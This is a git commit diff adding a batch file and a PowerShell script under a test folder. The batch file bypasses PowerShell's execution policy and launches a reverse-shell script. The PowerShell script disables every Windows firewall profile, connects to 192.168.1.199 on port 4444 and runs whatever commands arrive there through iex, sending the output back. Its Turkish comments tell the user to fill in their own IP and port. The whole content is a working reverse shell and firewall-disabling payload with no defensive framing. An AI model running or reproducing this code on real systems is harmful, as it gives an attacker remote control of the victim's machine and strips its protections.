a5690d6d14bf10650f0bd7e611cf573144313a99
Samcr00t <roman.mammadov22@gmail.com>
2024-12-04 14:49:53 -0500

    add .bat file

---
+++ test/script_runner.bat
@@ -0,0 +1,2 @@
+powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force"
+powershell -File "C:\Users\Admin\Desktop\reverse_shell.ps1"
---
+++ test/test_reverse_s.ps1
@@ -0,0 +1,14 @@
+Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+$client = New-Object System.Net.Sockets.TCPClient('192.168.1.199', 4444)  # Kendi IP'nizi ve portu girin
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535 | % { 0 }
+while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+    $sendback = (iex $data 2>&1 | Out-String)  # KomutlarÄ± Ã§alÄ±ÅŸtÄ±r
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte, 0, $sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()
